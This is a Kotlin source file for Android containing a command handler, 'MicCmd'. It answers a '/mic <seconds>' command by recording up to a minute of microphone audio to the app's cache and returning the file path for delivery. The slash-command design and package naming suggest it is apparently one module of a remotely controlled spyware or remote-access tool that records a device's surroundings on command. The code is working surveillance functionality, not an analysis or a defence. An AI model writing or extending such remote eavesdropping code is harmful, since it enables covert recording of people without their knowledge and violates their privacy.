package com.serv.app.cmds

import android.Manifest
import android.content.Context
import android.media.MediaRecorder
import com.serv.app.core.Perms
import java.io.File

object MicCmd {
    fun run(ctx: Context, args: String): String {
        val secs = args.toIntOrNull()?.coerceIn(1, 60) ?: return "uso: /mic <segundos 1..60>"
        if (!Perms.has(ctx, Manifest.permission.RECORD_AUDIO)) return "Permissão faltando: RECORD_AUDIO"
        val out = File(ctx.cacheDir, "v_${System.currentTimeMillis()}.m4a")
        val rec = MediaRecorder(ctx).apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            setAudioSamplingRate(44100)
            setAudioEncodingBitRate(96000)
            setOutputFile(out.absolutePath)
        }
        return try {
            rec.prepare()
            rec.start()
            Thread.sleep(secs * 1000L)
            rec.stop()
            rec.release()
            "__VOICE__:${out.absolutePath}"
        } catch (t: Throwable) {
            runCatching { rec.stop() }
            runCatching { rec.release() }
            "ERRO mic: ${t.message}"
        }
    }
}
